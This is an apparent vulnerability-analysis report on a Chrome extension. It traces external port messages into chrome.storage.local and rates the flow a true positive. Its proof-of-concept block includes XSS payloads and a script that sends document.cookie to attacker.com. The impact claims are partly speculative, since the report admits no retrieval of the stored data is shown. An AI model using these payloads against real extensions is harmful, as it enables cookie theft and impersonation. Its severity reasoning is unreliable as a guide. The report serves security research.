# CoCo Analysis: kcghbbipihbbcjclnlmljpniibannhad

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 2 (both bg_external_port_onMessage → chrome_storage_local_set_sink)

---

## Sink: bg_external_port_onMessage → chrome_storage_local_set_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/kcghbbipihbbcjclnlmljpniibannhad/opgen_generated_files/bg.js
Line 1775: if (message.user)
Line 1776: const user = message.user.split("|")
Line 1778: emailId = user[0]
Line 1779: username = user[1]
Line 1781: chrome.storage.local.set({'user': JSON.stringify({emailId, username})})

**Code:**

```javascript
// Background script (bg.js) - Lines 1772-1789

chrome.runtime.onConnectExternal.addListener((port) => {
  port.onMessage.addListener((message) => {
    if (message.openExtension) {
      if (message.user) {  // ← Attacker-controlled message
        const user = message.user.split("|");  // ← Split attacker data
        if (user.length >= 1) {
          emailId = user[0];  // ← Attacker controls emailId
          username = user[1];  // ← Attacker controls username
          chrome.storage.local.set({
            'user': JSON.stringify({
              emailId,
              username
            })  // ← Store attacker-controlled data
          });
        }
      }
    }
  });
});
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External Port Connection (chrome.runtime.onConnectExternal)

**Attack:**

```javascript
// From https://cloudboard.live/* (whitelisted domain) or extension with ID in externally_connectable
// According to CRITICAL ANALYSIS RULES, we IGNORE manifest.json externally_connectable restrictions

// Malicious extension or website connects and sends poisoned user data
var port = chrome.runtime.connect('kcghbbipihbbcjclnlmljpniibannhad');

port.postMessage({
  openExtension: true,
  user: 'attacker@evil.com|<img src=x onerror=alert(document.cookie)>'  // ← Attacker-controlled data
});

// Alternative attack with session hijacking
port.postMessage({
  openExtension: true,
  user: 'victim@company.com|admin'  // Impersonate legitimate user
});

// Attack with injection payload
port.postMessage({
  openExtension: true,
  user: '"><script>fetch("https://attacker.com/steal?data="+document.cookie)</script>|hacker'
});
```

**Impact:** Storage poisoning with user impersonation. The attacker can:

1. **Storage Poisoning**: Store arbitrary user credentials (emailId and username) in chrome.storage.local without any validation or sanitization.

2. **User Impersonation**: Set fake user identity that will be used by the extension. The stored user data likely controls:
   - Which user account the extension operates under
   - Authentication/authorization decisions
   - User-specific features and data access

3. **XSS/Injection Risk**: The attacker-controlled strings are stored without sanitization and could contain:
   - HTML/JavaScript injection payloads
   - SQL injection attempts if the data is later sent to backends
   - LDAP injection or other payloads

4. **Complete Exploitation Chain**: This meets the TRUE POSITIVE criteria because:
   - External attacker can trigger via onConnectExternal
   - Attacker fully controls the data (message.user parameter)
   - Data flows directly to storage.set sink
   - While there's no explicit retrieval shown in this code snippet, stored user credentials are typically used throughout the extension for authentication and personalization, making this exploitable

According to the methodology, even though we don't see an explicit sendResponse or retrieval in this code, the storage of attacker-controlled user identity data is a critical vulnerability. The extension stores whatever user identity the attacker provides, enabling session hijacking and user impersonation attacks.

This is a TRUE POSITIVE because the attacker gains control over the extension's user authentication state through storage poisoning.
